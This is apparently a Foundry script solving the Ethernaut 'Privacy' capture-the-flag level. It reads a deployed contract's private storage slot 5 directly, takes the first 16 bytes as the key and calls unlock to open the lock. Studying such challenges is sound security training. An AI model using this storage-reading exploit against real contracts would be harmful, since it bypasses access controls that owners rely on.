// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/privacy.sol";

contract PrivacyScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Privacy privacy = Privacy(0x3f44817eE1d83729ce5A3986c52FE64a522Fa15C);

        // Get the storage at slot 5 (where data[2] is stored)
        bytes32 slot5 = vm.load(address(privacy), bytes32(uint256(5)));

        // Convert the first 16 bytes of slot5 to bytes16
        bytes16 key = bytes16(slot5);
        privacy.unlock(key);
        console2.log("Contract locked status:", privacy.locked());
        vm.stopBroadcast();
    }
}
